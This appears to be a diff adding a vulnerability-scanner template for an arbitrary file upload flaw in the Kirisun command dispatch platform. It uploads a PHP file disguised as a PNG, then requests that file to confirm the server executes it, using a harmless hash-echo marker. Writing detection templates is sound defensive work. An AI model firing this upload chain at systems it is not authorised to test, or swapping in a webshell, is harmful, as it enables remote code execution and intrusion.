@@ -1,0 +1,68 @@
+id: poc-yaml-kirisun-task-uploadfile-upload
+info:
+  name: 福建科立讯通信 指挥调度管理平台 task/uploadfile 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    福建科立讯通信的指挥调度管理平台存在任意文件上传漏洞，攻击者可以利用该漏洞上传恶意文件。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/custom/zx/task/uploadfile.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu"
+    body: |
+      ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+      Content-Disposition: form-data; name="uuid"
+      
+      1
+      ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+      Content-Disposition: form-data; name="number"
+      
+      200
+      ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+      Content-Disposition: form-data; name="uploadfile"; filename="d.php"
+      Content-Type: image/png
+      
+      <?php echo md5({{t1}}); ?>
+      ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "successed"
+          - "\"url\""
+        part: body
+    extractors:
+      - type: regex
+        name: uploaded_file_name
+        part: body
+        internal: true
+        regex:
+          - "upload\\/task\\/(?P<name>.*?).php"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/upload/task/{{uploaded_file_name}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
